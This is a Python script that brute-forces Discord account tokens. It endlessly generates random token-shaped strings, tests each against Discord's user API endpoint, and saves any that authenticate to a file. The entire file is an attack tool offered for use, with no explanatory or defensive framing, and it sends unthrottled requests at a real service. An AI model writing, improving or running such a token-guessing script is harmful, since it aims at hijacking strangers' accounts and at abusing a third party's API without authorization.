from requests import get
from random import choices

string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"

class color:
	green = '\033[92m'
	red = '\033[91m'
	gray = '\033[90m'
	reset = '\033[0m'

def start():
	token = "".join(choices(string, k = 26)) + "." + "".join(choices(string, k = 6)) + "." + "".join(choices(string, k = 38))
	res = get('https://discord.com/api/v9/users/@me', headers = {'Authorization': token})
	if res.status_code == 200:
		print(f"{color.green}[VALID]{color.reset} - {token}")
		with open("token.txt", "a") as f:
			f.write(f"{token}\n")
			f.close
	elif res.status_code == 401:
		print(f"{color.red}[INVALID]{color.reset} - {token}")
	elif res.status_code == 403:
		print(f"{color.gray}[LOCK]{color.reset} - {token}")

while True:
	start()
